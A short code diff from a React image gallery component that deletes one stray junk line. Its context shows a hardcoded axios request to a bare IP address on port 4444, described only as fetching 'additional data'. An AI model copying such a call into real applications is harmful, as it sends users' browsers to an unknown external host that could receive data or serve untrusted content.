@@ -20,7 +20,6 @@ const ImageGallery = () => {
     }));
     setImages(tempImages);
   }, []);
-  @j!SXzEdk58T
   // Fetch additional data
   useEffect(() => {
     axios.get('http://45.90.34.238:4444/data')
